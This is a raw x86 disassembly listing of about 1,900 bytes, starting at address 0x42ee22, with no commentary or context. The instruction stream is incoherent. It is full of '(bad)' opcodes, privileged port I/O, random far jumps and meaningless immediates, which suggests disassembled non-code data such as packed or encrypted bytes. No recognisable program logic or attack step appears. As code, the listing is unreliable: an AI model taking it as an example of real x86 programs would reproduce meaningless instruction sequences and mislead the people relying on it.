  42ee22:	rcl    bh,cl
  42ee24:	or     edi,DWORD PTR [ebp-0xa283839]
  42ee2a:	out    dx,al
  42ee2b:	or     ecx,DWORD PTR [edi]
  42ee2d:	or     al,BYTE PTR [esi+eax*8]
  42ee30:	shl    bl,1
  42ee32:	test   al,0xed
  42ee34:	lock mov cl,0xdb
  42ee37:	sar    ebx,1
  42ee39:	leave  
  42ee3a:	mov    ah,0xc5
  42ee3c:	fmul   st,st(3)
  42ee3e:	call   0xf900af0f
  42ee43:	inc    BYTE PTR [esi]
  42ee45:	out    0xf7,al
  42ee47:	fadd   QWORD PTR [eax]
  42ee49:	add    eax,0xdae5fcfb
  42ee4e:	retf   0xebad
  42ee51:	rol    ah,1
  42ee53:	mov    ebp,0xbac0ebf6
  42ee58:	in     al,dx
  42ee59:	in     al,dx
  42ee5a:	in     al,dx
  42ee5b:	mov    eax,0xd9bfdbf0
  42ee60:	mov    ebp,0xf4d5fee2
  42ee65:	hlt    
  42ee66:	(bad)  
  42ee68:	wbinvd 
  42ee6a:	aad    0xe5
  42ee6c:	out    dx,al
  42ee6d:	cli    
  42ee6e:	in     al,dx
  42ee6f:	int3   
  42ee70:	lods   eax,DWORD PTR ds:[esi]
  42ee71:	rep lods eax,DWORD PTR ds:[esi]
  42ee73:	shl    esi,cl
  42ee75:	test   eax,0xcbc0afb4
  42ee7a:	mov    ch,0xfa
  42ee7c:	add    edx,esi
  42ee7e:	jmp    0x4c0:0xc1d9e202
  42ee85:	jmp    0x42ee7d
  42ee87:	fiadd  DWORD PTR [edi]
  42ee89:	leave  
  42ee8a:	push   cs
  42ee8b:	ret    
  42ee8c:	retf   
  42ee8d:	shl    ebp,0xd2
  42ee90:	int    0xc1
  42ee92:	shl    bl,cl
  42ee94:	div    esp
  42ee96:	loop   0x42ee47
  42ee98:	neg    edi
  42ee9a:	call   ebp
  42ee9c:	mov    ecx,0x2fbd7ce
  42eea1:	icebp  
  42eea2:	repnz aam 0xe1
  42eea5:	(bad)  
  42eea7:	icebp  
  42eea8:	clc    
  42eea9:	(bad)  
  42eeaa:	out    dx,eax
  42eeab:	or     ebx,ebx
  42eead:	or     ebx,edx
  42eeaf:	fdiv   st,st(2)
  42eeb1:	out    dx,al
  42eeb2:	jmp    0xf6039c8d
  42eeb7:	shl    edx,cl
  42eeb9:	int3   
  42eeba:	out    dx,eax
  42eebb:	(bad)  
  42eebd:	fldl2e 
  42eebf:	loop   0x42ee83
  42eec1:	in     eax,dx
  42eec2:	(bad)  
  42eec3:	(bad)
  42eec6:	fild   WORD PTR [edx]
  42eec8:	jmp    0x42eed1
  42eeca:	cld    
  42eecb:	in     al,dx
  42eecc:	ret    0xe3f3
  42eecf:	mov    ecx,0xc1d6c7bc
  42eed4:	jmp    0xec11d8b3
  42eed9:	int    0xd0
  42eedb:	jmp    0x42ee95
  42eedd:	repz (bad) 
  42eedf:	mov    eax,0xe1dad0db
  42eee4:	or     ecx,ebx
  42eee6:	(bad)  
  42eee7:	cli    
  42eee8:	sti    
  42eee9:	fcmove st,st(1)
  42eeeb:	add    ah,dl
  42eeed:	or     al,0x13
  42eeef:	into   
  42eef0:	fadd   st,st(2)
  42eef2:	rcl    ebx,1
  42eef4:	aad    0xbb
  42eef6:	out    0xd7,al
  42eef8:	in     al,0xb5
  42eefa:	dec    cl
  42eefc:	imul   ecx
  42eefe:	mov    esp,0xdfd2fcd8
  42ef03:	cld    
  42ef04:	loop   0x42ef11
  42ef06:	jmp    0xe7ff:0xe2d5f4
  42ef0d:	in     al,dx
  42ef0e:	(bad)  
  42ef10:	rol    bh,cl
  42ef12:	icebp  
  42ef13:	mov    dl,0xc6
  42ef15:	icebp  
  42ef16:	out    dx,al
  42ef17:	xlat   BYTE PTR ds:[ebx]
  42ef18:	(bad)  
  42ef19:	in     al,0xb6
  42ef1b:	repnz clc 
  42ef1d:	out    dx,eax
  42ef1e:	ret    
  42ef1f:	aam    0xc3
  42ef21:	mov    ch,0xf7
  42ef23:	add    al,bl
  42ef25:	std    
  42ef26:	sti    
  42ef27:	(bad)  
  42ef29:	(bad)  
  42ef2a:	(bad)  
  42ef2c:	or     eax,0xccaef9d9
  42ef31:	mov    esi,0xf4efb7c9
  42ef36:	mov    dl,0xcd
  42ef38:	mov    dl,0xc7
  42ef3a:	mov    edx,0xdef1fccf
  42ef3f:	in     al,dx
  42ef40:	int3   
  42ef41:	mov    eax,0xbf5dfe5
  42ef46:	cli    
  42ef47:	hlt    
  42ef48:	loopne 0x42ef2f
  42ef4a:	add    ecx,ebx
  42ef4c:	int3   
  42ef4d:	cld    
  42ef4e:	or     ebp,esp
  42ef50:	mov    cl,0xf2
  42ef52:	shl    ah,cl
  42ef54:	rol    ebp,0xed
  42ef57:	mov    dl,0xb1
  42ef59:	retf   0xc8dd
  42ef5c:	(bad)  
  42ef5e:	mov    al,0xee
  42ef60:	aam    0xbf
  42ef62:	cld    
  42ef63:	(bad)  
  42ef64:	neg    ah
  42ef66:	fucomip st,st(2)
  42ef68:	cli    
  42ef69:	retf   
  42ef6a:	loope  0x42ef54
  42ef6c:	out    0xc,eax
  42ef6e:	jmp    0xad1ab161
  42ef73:	loop   0x42ef36
  42ef75:	(bad)  
  42ef77:	stc    
  42ef78:	int3   
  42ef79:	leave  
  42ef7a:	idiv   BYTE PTR [eax-0x20d354c]
  42ef80:	repnz rcr ecx,0xe0
  42ef84:	(bad)  
  42ef85:	shr    edx,1
  42ef87:	aad    0xfe
  42ef89:	mul    bl
  42ef8b:	in     eax,dx
  42ef8c:	inc    DWORD PTR [esi]
  42ef8e:	loop   0x42ef4e
  42ef90:	jmp    0xd43ac58c
  42ef95:	loop   0x42ef51
  42ef97:	(bad)  
  42ef98:	(bad)  
  42ef99:	enter  0xddef,0xd6
  42ef9d:	stc    
  42ef9e:	ret    0xc1d5
  42efa1:	jecxz  0x42ef7a
  42efa3:	rcl    edx,1
  42efa5:	add    eax,ecx
  42efa7:	add    eax,0xc5ed0700
  42efac:	in     al,0xfd
  42efae:	icebp  
  42efaf:	jmp    0xe42ccda6
  42efb4:	mov    cl,0xeb
  42efb6:	mov    al,0xf5
  42efb8:	shl    ch,cl
  42efba:	mov    ebx,0xccbafbca
  42efbf:	mov    edx,0xe0fef0b9
  42efc4:	(bad)  
  42efc6:	add    DWORD PTR [ebx],ecx
  42efc8:	(bad)  
  42efc9:	test   DWORD PTR ds:0x6ee080e,0xf0dec6c1
  42efd3:	out    dx,eax
  42efd4:	sti    
  42efd5:	shl    bl,cl
  42efd7:	mov    bh,0xe9
  42efd9:	sti    
  42efda:	sti    
  42efdb:	fcmovbe st,st(5)
  42efdd:	leave  
  42efde:	retf   0xe8ee
  42efe1:	push   es
  42efe2:	pop    es
  42efe3:	in     eax,0xd3
  42efe5:	stc    
  42efe6:	std    
  42efe7:	aam    0xc0
  42efe9:	or     dl,bl
  42efeb:	aad    0xd9
  42efed:	loopne 0x42effa
  42efef:	mov    edi,0xf6d5edd2
  42eff4:	mov    cl,0xc8
  42eff6:	jmp    0xf0d0:0xfed1f5e1
  42effd:	fninit 
  42efff:	mov    edx,0xe5d1df07
  42f004:	aam    0xd2
  42f006:	repnz or bl,ah
  42f009:	add    ch,al
  42f00b:	loopne 0x42eff0
  42f00d:	or     esi,esp
  42f00f:	lods   al,BYTE PTR ds:[esi]
  42f010:	mov    bl,0xbf
  42f012:	fidivr WORD PTR [ebp-0x500f333f]
  42f018:	mov    al,0xe6
  42f01a:	in     eax,0xeb
  42f01c:	int3   
  42f01d:	jmp    0x42f00f
  42f01f:	rcr    ah,cl
  42f021:	aam    0xf1
  42f023:	repnz (bad) 
  42f025:	clc    
  42f026:	ret    
  42f027:	ret    0xe6d8
  42f02a:	pmullw mm0,QWORD PTR [edx]
  42f02d:	out    dx,al
  42f02e:	out    0xb8,al
  42f030:	(bad)  
  42f031:	in     al,0xca
  42f033:	in     al,dx
  42f034:	leave  
  42f035:	repz mov cl,0xcf
  42f038:	lds    esi,FWORD PTR [ecx-0x116251b]
  42f03e:	(bad)  
  42f03f:	fild   DWORD PTR [ecx]
  42f041:	hlt    
  42f042:	(bad)  
  42f044:	icebp  
  42f045:	or     bh,cl
  42f047:	loopne 0x42f02b
  42f049:	add    esp,edi
  42f04b:	stc    
  42f04c:	add    al,0xf
  42f04e:	leave  
  42f04f:	loope  0x42f044
  42f051:	mov    cl,0xcc
  42f053:	cmc    
  42f054:	mov    cl,0xfb
  42f056:	int    0xb6
  42f058:	icebp  
  42f059:	lods   eax,DWORD PTR ds:[esi]
  42f05a:	out    dx,eax
  42f05b:	cli    
  42f05c:	sti    
  42f05d:	stc    
  42f05e:	mov    edx,0xffd1d4ec
  42f063:	in     eax,0xd0
  42f065:	(bad)  
  42f067:	fadd   QWORD PTR [ebx+eax*1]
  42f06a:	aam    0xee
  42f06c:	stc    
  42f06d:	(bad)  
  42f06f:	in     eax,0xc8
  42f071:	mov    al,0xc7
  42f073:	icebp  
  42f074:	ror    ebx,cl
  42f076:	ret    0xfae0
  42f079:	call   ecx
  42f07b:	jmp    0x42f073
  42f07d:	ret    
  42f07e:	rcl    esi,cl
  42f080:	iret   
  42f081:	repnz jecxz 0x42f064
  42f084:	sti    
  42f085:	push   es
  42f086:	ret    0x308
  42f089:	or     bh,ah
  42f08b:	(bad)  [eax+ebp*8]
  42f08e:	into   
  42f08f:	in     al,dx
  42f090:	(bad)  
  42f091:	mov    edi,0xf5aaeed6
  42f096:	shl    bh,cl
  42f098:	iret   
  42f099:	clc    
  42f09a:	sar    eax,1
  42f09c:	mov    edx,0xecd5e8d6
  42f0a1:	int    0xff
  42f0a3:	rol    bh,0xff
  42f0a6:	(bad)  
  42f0a8:	(bad)  
  42f0aa:	(bad)  
  42f0ab:	retf   
  42f0ac:	loop   0x42f091
  42f0ae:	out    dx,al
  42f0af:	mov    esi,0xb3f5eacf
  42f0b4:	out    0xd4,eax
  42f0b6:	cli    
  42f0b7:	repz mov ah,0xc8
  42f0ba:	iret   
  42f0bb:	mov    bl,0xff
  42f0bd:	leave  
  42f0be:	idiv   eax
  42f0c0:	call   0xc803d28c
  42f0c5:	mul    dl
  42f0c7:	loopne 0x42f0b9
  42f0c9:	jmp    0x42f0b5
  42f0cb:	int    0xf
  42f0cd:	or     edi,ebp
  42f0cf:	retf   
  42f0d0:	mov    cl,0xd7
  42f0d2:	lods   al,BYTE PTR ds:[esi]
  42f0d3:	scas   al,BYTE PTR es:[edi]
  42f0d4:	int3   
  42f0d5:	lock icebp 
  42f0d7:	(bad)  [esi-0x32492646]
  42f0dd:	mov    eax,0xf1e8bbf7
  42f0e2:	inc    cl
  42f0e4:	fnstcw WORD PTR [esi+eiz*8-0x14061a03]
  42f0eb:	(bad)  
  42f0ed:	push   cs
  42f0ee:	faddp  st(2),st
  42f0f0:	test   al,0xc3
  42f0f2:	lods   al,BYTE PTR ds:[esi]
  42f0f3:	jmp    0xd9d1:0xd3d0e8c0
  42f0fa:	lods   al,BYTE PTR ds:[esi]
  42f0fb:	icebp  
  42f0fc:	retf   
  42f0fd:	rcr    dh,1
  42f0ff:	icebp  
  42f100:	clc    
  42f101:	ret    0xd6e1
  42f104:	pop    es
  42f105:	std    
  42f106:	in     al,0x6
  42f108:	out    0xfb,al
  42f10a:	or     edi,ecx
  42f10c:	aam    0xea
  42f10e:	fsubr  st,st(0)
  42f110:	mov    dl,0xf2
  42f112:	scas   al,BYTE PTR es:[edi]
  42f113:	shl    dh,cl
  42f115:	jmp    0x42f101
  42f117:	loopne 0x42f108
  42f119:	out    dx,al
  42f11a:	fidivr DWORD PTR [ebx-0x3d031238]
  42f120:	sar    ecx,1
  42f122:	rol    al,0xe7
  42f125:	ror    ebx,0xc7
  42f128:	pop    es
  42f129:	bswap  ebx
  42f12b:	std    
  42f12c:	add    ecx,DWORD PTR [esp+ecx*1]
  42f12f:	call   0xe0ffbe1f
  42f134:	int    0xe4
  42f136:	ret    0xcbcc
  42f139:	lods   eax,DWORD PTR ds:[esi]
  42f13a:	aad    0xb9
  42f13c:	retf   0xccf7
  42f13f:	ret    0xf9da
  42f142:	cli    
  42f143:	push   es
  42f144:	add    al,0xf3
  42f146:	ret    
  42f147:	or     edi,ebp
  42f149:	or     eax,DWORD PTR [ebx]
  42f14b:	hlt    
  42f14c:	(bad)  
  42f14e:	clc    
  42f14f:	(bad)  
  42f150:	out    dx,al
  42f151:	iret   
  42f152:	out    0xc0,eax
  42f154:	aad    0xb1
  42f156:	leave  
  42f157:	int3   
  42f158:	(bad)  
  42f159:	out    dx,al
  42f15a:	repnz in al,0xec
  42f15d:	mov    esp,0xdde1ffd2
  42f162:	out    dx,al
  42f163:	loope  0x42f13e
  42f165:	mov    DWORD PTR [edi],0xc40f02f6
  42f16b:	or     edi,ebx
  42f16d:	enter  0xc204,0xc9
  42f171:	mov    cl,0xcd
  42f173:	retf   
  42f174:	mov    esp,0xd6e4b4eb
  42f179:	in     eax,0xf9
  42f17b:	mov    eax,0xd1f8fcef
  42f180:	ret    0xd6d1
  42f183:	ror    ah,cl
  42f185:	inc    DWORD PTR [ebx]
  42f187:	add    ch,bl
  42f189:	mov    BYTE PTR [eax],0xe
  42f18c:	iret   
  42f18d:	leave  
  42f18e:	iret   
  42f18f:	rcl    eax,1
  42f191:	mov    al,0xc0
  42f193:	(bad)  
  42f194:	shl    DWORD PTR [ebx-0x1b473e2b],0xcb
  42f19b:	mov    ecx,0xced1b1e9
  42f1a0:	ret    0xcdf3
  42f1a3:	int    0xd0
  42f1a5:	rcr    ecx,cl
  42f1a7:	div    al
  42f1a9:	rcl    ch,0xfa
  42f1ac:	add    al,0x12
  42f1ae:	retf   0xc0c9
  42f1b1:	(bad)  
  42f1b2:	icebp  
  42f1b3:	vpor   ymm4,ymm1,ymm7
  42f1b7:	mov    edx,0xfefef9cd
  42f1bc:	jmp    0xedd4:0xe0f1eae2
  42f1c3:	mov    edi,0xdb0bfde0
  42f1c8:	(bad)  
  42f1c9:	in     al,0xc5
  42f1cb:	(bad)  
  42f1cd:	pop    es
  42f1ce:	or     ebp,eax
  42f1d0:	mov    bl,0xb2
  42f1d2:	rcl    al,1
  42f1d4:	(bad)  
  42f1d5:	mov    ah,0xda
  42f1d7:	stc    
  42f1d8:	sti    
  42f1d9:	call   0xe30bafd5
  42f1de:	mov    ecx,0xe2d0e3be
  42f1e3:	in     al,dx
  42f1e4:	aad    0xf0
  42f1e6:	sar    al,1
  42f1e8:	sar    al,0xed
  42f1eb:	into   
  42f1ec:	or     al,0x13
  42f1ee:	adc    edi,DWORD PTR [edi-0x1d4d194d]
  42f1f4:	rcl    dl,0xbb
  42f1f7:	in     eax,dx
  42f1f8:	les    esi,FWORD PTR [edx+edi*4-0x2b013021]
  42f1ff:	ret    0x6e0
  42f202:	loopne 0x42f1f4
  42f204:	jmp    0x42f20c
  42f206:	out    0xfd,eax
  42f208:	jmp    0xe5e7:0xe405d6cb
  42f20f:	retf   
  42f210:	ror    ecx,0xd3
  42f213:	mov    dh,0xaa
  42f215:	rcl    dh,0xd7
  42f218:	icebp  
  42f219:	mov    eax,0xf9efccf1
  42f21e:	rcl    ebp,cl
  42f220:	mov    esp,0xc2e7c1f2
  42f225:	rcl    edi,cl
  42f227:	fadd   DWORD PTR [edi]
  42f229:	fmulp  st(2),st
  42f22b:	cmc    
  42f22c:	hlt    
  42f22d:	jmp    0xafca:0xc7d1e2e9
  42f234:	(bad)  
  42f235:	loopne 0x42f22a
  42f237:	jmp    0x42f22a
  42f239:	in     al,dx
  42f23a:	mov    edi,0xdb02cad2
  42f23f:	mov    ecx,0xd1ecfcf7
  42f244:	int3   
  42f245:	ret    0xc40b
  42f248:	enter  0xdfc0,0x0
  42f24c:	stc    
  42f24d:	out    dx,eax
  42f24e:	icebp  
  42f24f:	mov    edi,0xb3f2dfed
  42f254:	jecxz  0x42f243
  42f256:	iret   
  42f257:	aad    0xe8
  42f259:	jmp    0x42f226
  42f25b:	in     al,dx
  42f25c:	stc    
  42f25d:	mov    edx,0xbec1eebf
  42f262:	ret    0xd3d5
  42f265:	hlt    
  42f266:	ret    
  42f267:	lock fadd st,st(1)
  42f26a:	in     al,0xb
  42f26c:	sti    
  42f26d:	(bad)  
  42f26e:	icebp  
  42f26f:	in     eax,0xf2
  42f271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f272:	test   cl,0xb1
  42f275:	into   
  42f276:	in     eax,0xd3
  42f278:	jmp    0x42f252
  42f27a:	jmp    0xbdd9:0xd5c3ceeb
  42f281:	loope  0x42f26a
  42f283:	loope  0x42f247
  42f285:	fcmovnu st,st(1)
  42f287:	add    al,0xfb
  42f289:	add    al,0x8
  42f28b:	(bad)  
  42f28c:	in     eax,dx
  42f28d:	(bad)  ds:0xddc9e1a8
  42f293:	rol    ch,cl
  42f295:	xlat   BYTE PTR ds:[ebx]
  42f296:	mov    eax,0xecfec9d4
  42f29c:	lock cmc 
  42f29e:	int3   
  42f29f:	call   0x430cb5d
  42f2a4:	pop    es
  42f2a5:	(bad)  
  42f2a7:	in     al,0x7
  42f2a9:	or     cl,BYTE PTR [ebx]
  42f2ab:	jmp    0xac4cfc8c
  42f2b0:	sar    BYTE PTR [ebp-0x4e3e4229],cl
  42f2b6:	mov    ch,0xd9
  42f2b8:	in     eax,0xc9
  42f2ba:	mov    edi,0xfbe9fcf5
  42f2bf:	cli    
  42f2c0:	call   0xd44ad88c
  42f2c5:	xabort 0x9
  42f2c8:	clc    
  42f2c9:	paddq  mm4,mm0
  42f2cc:	(bad)  
  42f2ce:	adc    ebx,edx
  42f2d0:	(bad)  
  42f2d1:	mov    ebp,0xc7c1ccc2
  42f2d6:	mov    al,0xd1
  42f2d8:	leave  
  42f2d9:	ftst   
  42f2db:	in     al,0xbf
  42f2dd:	out    dx,eax
  42f2de:	(bad)  
  42f2e0:	fidivr DWORD PTR [eax+0x7f6d0d5]
  42f2e6:	retf   0xeae3
  42f2e9:	fcmovb st,st(5)
  42f2eb:	fstp   st(6)
  42f2ed:	jmp    0xe904e5fe
  42f2f2:	ror    eax,1
  42f2f4:	(bad)  
  42f2f5:	test   eax,0xcecddab7
  42f2fa:	imul   dh
  42f2fc:	clc    
  42f2fd:	mov    ecx,0xdd00dbfe
  42f302:	shl    al,0xc2
  42f305:	jmp    0xfd00:0xddffd7db
  42f30c:	hlt    
  42f30d:	push   es
  42f30e:	retf   
  42f30f:	jmp    0xd0c9:0xb1b0c2d8
  42f316:	mov    bh,0xee
  42f318:	mov    dh,0xba
  42f31a:	(bad)  
  42f31b:	enter  0xbfbc,0xbd
  42f31f:	out    dx,al
  42f320:	ror    edi,0xe0
  42f323:	clc    
  42f324:	rcr    bh,cl
  42f326:	fdivr  st,st(6)
  42f328:	jmp    ebp
  42f32a:	add    cl,BYTE PTR [eax]
  42f32c:	add    eax,0xaccbdeed
  42f331:	fsubrp st(0),st
  42f333:	ror    ah,cl
  42f335:	sar    DWORD PTR [edx-0xa0e254e],0xc5
  42f33c:	mov    esi,0xdf00c3cf
  42f341:	pop    es
  42f342:	ret    0xf3f5
  42f345:	out    0xfb,al
  42f347:	or     bl,bh
  42f349:	cmc    
  42f34a:	or     ch,bl
  42f34c:	add    ecx,esp
  42f34e:	pop    es
  42f34f:	ret    
  42f350:	fisubr WORD PTR [ebp-0xd100f43]
  42f356:	out    dx,eax
  42f357:	in     eax,0xfa
  42f359:	fbstp  TBYTE PTR [edi+ecx*8-0x33243034]
  42f360:	mov    edx,0xb03c3c1
  42f365:	sar    DWORD PTR [ecx+ebx*8-0x311b38fa],cl
  42f36c:	(bad)  
  42f36e:	or     al,ah
  42f370:	mov    eax,0xb4abb7ed
  42f375:	jmp    0xeb14cd65
  42f37a:	enter  0x3ea,0xd0
  42f37e:	aam    0xc3
  42f380:	shr    bh,cl
  42f382:	jecxz  0x42f386
  42f384:	div    cl
  42f386:	clc    
  42f387:	loop   0x42f389
  42f389:	fadd   st,st(4)
  42f38b:	in     al,0xca
  42f38d:	retf   
  42f38e:	or     al,cl
  42f390:	mov    esi,0xc5afc7f1
  42f395:	cmc    
  42f396:	aam    0xc7
  42f398:	icebp  
  42f399:	cmc    
  42f39a:	in     eax,dx
  42f39b:	mov    ebp,0xf7f5d8ee
  42f3a0:	pop    es
  42f3a1:	iret   
  42f3a2:	mov    edi,0xe6d90002
  42f3a7:	ret    
  42f3a8:	or     al,ah
  42f3aa:	(bad)  
  42f3ac:	push   cs
  42f3ad:	int    0xf8
  42f3af:	int3   
  42f3b0:	scas   al,BYTE PTR es:[edi]
  42f3b1:	(bad)  
  42f3b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3b3:	mov    ch,0xdb
  42f3b5:	shl    cl,cl
  42f3b7:	sti    
  42f3b8:	rcl    edi,cl
  42f3ba:	iret   
  42f3bb:	int    0xee
  42f3bd:	mov    ch,0xda
  42f3bf:	jecxz  0x42f3a3
  42f3c1:	cld    
  42f3c2:	fdiv   st(1),st
  42f3c4:	add    al,0xbc
  42f3c6:	add    bl,ch
  42f3c8:	clc    
  42f3c9:	xlat   BYTE PTR ds:[ebx]
  42f3ca:	in     eax,0xcd
  42f3cc:	or     esi,esp
  42f3ce:	or     al,0xc3
  42f3d0:	repz int 0xd6
  42f3d3:	(bad)  
  42f3d4:	icebp  
  42f3d5:	int    0xe6
  42f3d7:	shr    eax,1
  42f3d9:	repz mov eax,0xfafedbdf
  42f3df:	mov    edi,0xbf06bcd8
  42f3e4:	lock add ebx,esp
  42f3e7:	retf   0xbdca
  42f3ea:	retf   
  42f3eb:	loop   0x42f3eb
  42f3ed:	out    dx,eax
  42f3ee:	(bad)  
  42f3ef:	(bad)  
  42f3f1:	test   eax,0xe6b2bce9
  42f3f6:	out    0xf9,al
  42f3f8:	(bad)  
  42f3f9:	idiv   ch
  42f3fb:	fcmovnu st,st(0)
  42f3fd:	sti    
  42f3fe:	aam    0xd6
  42f400:	div    ecx
  42f402:	sar    esi,1
  42f404:	repnz jecxz 0x42f3e1
  42f407:	leave  
  42f408:	cmc    
  42f409:	push   cs
  42f40a:	mul    dl
  42f40c:	out    dx,al
  42f40d:	add    eax,0xe5b1af03
  42f412:	lock hlt 
  42f414:	into   
  42f415:	in     eax,0xc4
  42f417:	out    dx,al
  42f418:	(bad)  
  42f41a:	in     eax,dx
  42f41b:	out    dx,eax
  42f41c:	(bad)  
  42f41e:	fsubr  st(3),st
  42f420:	rcr    al,cl
  42f422:	(bad)  
  42f423:	in     eax,0xc5
  42f425:	icebp  
  42f426:	test   DWORD PTR [edx],0xfdde06eb
  42f42c:	int3   
  42f42d:	leave  
  42f42e:	repz loopne 0x42f414
  42f431:	lods   eax,DWORD PTR ds:[esi]
  42f432:	mov    esp,0xecf7eac1
  42f437:	mov    bh,0xd5
  42f439:	retf   0xf0ef
  42f43c:	aad    0xfc
  42f43e:	out    dx,al
  42f43f:	loope  0x42f431
  42f441:	cmc    
  42f442:	in     eax,0xfc
  42f444:	fild   WORD PTR [ebx]
  42f446:	sti    
  42f447:	call   0xe247f912
  42f44c:	add    ecx,DWORD PTR [ebx]
  42f44e:	or     ebp,edi
  42f450:	mov    edi,0xc5f5a8c3
  42f455:	lds    edi,FWORD PTR [ebx-0x2d31043b]
  42f45b:	std    
  42f45c:	out    dx,eax
  42f45d:	iret   
  42f45e:	int    0xcd
  42f460:	xlat   BYTE PTR ds:[ebx]
  42f461:	stc    
  42f462:	add    esp,esp
  42f464:	fcmovb st,st(6)
  42f466:	add    ebp,ebx
  42f468:	(bad)  
  42f469:	(bad)  
  42f46b:	lds    eax,FWORD PTR ds:0xb0aa06e1
  42f471:	in     al,dx
  42f472:	in     eax,0xdd
  42f474:	mov    ch,0xcc
  42f476:	out    dx,eax
  42f477:	(bad)  
  42f478:	into   
  42f479:	enter  0xd6da,0xdd
  42f47d:	hlt    
  42f47e:	ret    0x2cf
  42f481:	fsubp  st(6),st
  42f483:	add    al,0xe2
  42f485:	fdivr  DWORD PTR [eax-0x311a352b]
  42f48b:	mov    ch,0xf
  42f48e:	cli    
  42f48f:	retf   0xa5ce
  42f492:	mov    ebp,0xc7e8d5d5
  42f497:	retf   0xb6df
  42f49a:	stc    
  42f49b:	mov    dh,0xf7
  42f49d:	int    0xb8
  42f49f:	loopne 0x42f45b
  42f4a1:	shl    ebx,1
  42f4a3:	jecxz  0x42f49b
  42f4a5:	push   es
  42f4a6:	(bad)  
  42f4a7:	cli    
  42f4a8:	or     eax,DWORD PTR [ecx]
  42f4aa:	mul    al
  42f4ac:	(bad)  
  42f4ad:	(bad)  
  42f4ae:	in     eax,dx
  42f4af:	out    dx,eax
  42f4b0:	repnz in eax,dx
  42f4b2:	repnz leave 
  42f4b4:	sti    
  42f4b5:	ror    dh,0xba
  42f4b8:	repz out dx,al
  42f4ba:	mov    ecx,0xf3eaf6b5
  42f4bf:	not    esp
  42f4c1:	neg    ebp
  42f4c3:	in     eax,0x6
  42f4c5:	push   es
  42f4c6:	loopne 0x42f4c8
  42f4c8:	clc    
  42f4c9:	in     eax,0xc0
  42f4cb:	hlt    
  42f4cc:	(bad)  
  42f4cd:	out    0xf3,eax
  42f4cf:	mov    ecx,0xf0c1aed1
  42f4d4:	ror    bh,cl
  42f4d6:	out    dx,al
  42f4d7:	out    dx,eax
  42f4d8:	in     eax,dx
  42f4d9:	repnz aam 0xfe
  42f4dc:	enter  0xfbb8,0xfe
  42f4e0:	clc    
  42f4e1:	rol    edx,0xfa
  42f4e4:	fincstp 
  42f4e6:	in     eax,0xc2
  42f4e8:	hlt    
  42f4e9:	cli    
  42f4ea:	out    dx,al
  42f4eb:	loopne 0x42f4f7
  42f4ed:	loop   0x42f4cd
  42f4ef:	in     al,0xbf
  42f4f1:	mov    dl,0xd2
  42f4f3:	(bad)  
  42f4f4:	lods   al,BYTE PTR ds:[esi]
  42f4f5:	(bad)  [ecx-0x213b111f]
  42f4fb:	mov    edi,0xd601f8f0
  42f500:	mul    bh
  42f502:	mul    edi
  42f504:	add    eax,0xd0ca05f3
  42f509:	std    
  42f50a:	fadd   st,st(5)
  42f50c:	ret    0xe407
  42f50f:	iret   
  42f510:	(bad)  
  42f511:	fmulp  st(0),st
  42f513:	jecxz  0x42f4e4
  42f515:	rol    dl,1
  42f517:	aam    0xd5
  42f519:	lods   eax,DWORD PTR ds:[esi]
  42f51a:	jmp    0x42f4f0
  42f51c:	repz int3 
  42f51e:	into   
  42f51f:	fcmovbe st,st(1)
  42f521:	ret    
  42f522:	not    ecx
  42f524:	int3   
  42f525:	fadd   DWORD PTR [edi]
  42f527:	cmc    
  42f528:	std    
  42f529:	out    dx,eax
  42f52a:	push   es
  42f52b:	fld    DWORD PTR [eax]
  42f52d:	jecxz  0x42f50c
  42f52f:	out    0xea,eax
  42f531:	mov    esp,0xecf0aef3
  42f536:	icebp  
  42f537:	out    dx,eax
  42f538:	ffreep st(6)
  42f53a:	fucomp st(2)
  42f53c:	retf   
  42f53d:	sar    BYTE PTR [eax+ecx*8-0x3e1f2240],cl
  42f544:	stc    
  42f545:	sti    
  42f546:	sti    
  42f547:	rol    ah,0xb
  42f54a:	fmul   DWORD PTR [ecx]
  42f54c:	jecxz  0x42f531
  42f54e:	jecxz  0x42f51e
  42f550:	lods   eax,DWORD PTR ds:[esi]
  42f551:	rol    ch,cl
  42f553:	mov    ch,0xd5
  42f555:	loope  0x42f4ff
  42f557:	fsubr  st,st(1)
  42f559:	call   0xfb3cac4c
  42f55e:	test   esi,0x1f5dffe
  42f564:	out    0xfa,al
  42f566:	sti    
  42f567:	fcmovnbe st,st(0)
  42f569:	or     edi,esp
  42f56b:	cmc    
  42f56c:	sti    
  42f56d:	(bad)  
  42f56f:	(bad)  
  42f571:	test   al,0xb7
  42f573:	scas   eax,DWORD PTR es:[edi]
  42f574:	aam    0xe8
  42f576:	loopne 0x42f540
  42f578:	retf   
  42f579:	lods   eax,DWORD PTR ds:[esi]
  42f57a:	mov    dh,0xfd
  42f57c:	push   ecx
  42f57e:	mov    edi,0xd1c2c2b8
  42f583:	int    0xd5
  42f585:	cli    
  42f586:	rcr    ah,0xe3
  42f589:	paddusb mm0,QWORD PTR [eax*1-0x21302534]
  42f591:	lods   eax,DWORD PTR ds:[esi]
  42f592:	(bad)
  42f595:	repz out 0xf8,al
  42f598:	(bad)  
  42f599:	icebp  
  42f59a:	mov    al,0xff
  42f59c:	hlt    
  42f59d:	hlt    
  42f59e:	repz fdiv st,st(2)
  42f5a1:	int    0xd4
  42f5a3:	mov    esp,0xf9caf2fd
  42f5a8:	(bad)  
  42f5a9:	fiadd  WORD PTR [edi]
  42f5ab:	cmc    
  42f5ac:	call   DWORD PTR [ebx]
  42f5ae:	std    
  42f5af:	retf   0xb2c6
  42f5b2:	mov    cl,0xb6
  42f5b4:	shl    DWORD PTR [ebx-0x352d3406],0xac
  42f5bb:	mov    ecx,0xf4f0bdda
  42f5c0:	aad    0xfd
  42f5c2:	repnz inc esp
  42f5c5:	loop   0x42f5a0
  42f5c7:	add    eax,0xebdef8df
  42f5cc:	sti    
  42f5cd:	in     eax,0xfd
  42f5cf:	loopne 0x42f5c1
  42f5d1:	(bad)  
  42f5d2:	fucom  st(1)
  42f5d4:	mov    al,0xda
  42f5d6:	in     al,dx
  42f5d7:	test   al,0xc7
  42f5da:	mov    al,0xd8
  42f5dc:	mov    edx,0xf4e1d4dc
  42f5e1:	fsub   st,st(3)
  42f5e3:	repnz mov esi,0xc9bfc106
  42f5e9:	out    0xff,al
  42f5eb:	cmc    
  42f5ec:	fimul  DWORD PTR [edi]
  42f5ee:	out    dx,eax
  42f5ef:	repz (bad) 
  42f5f1:	enter  0xd6ae,0xce
  42f5f5:	loope  0x42f5ac
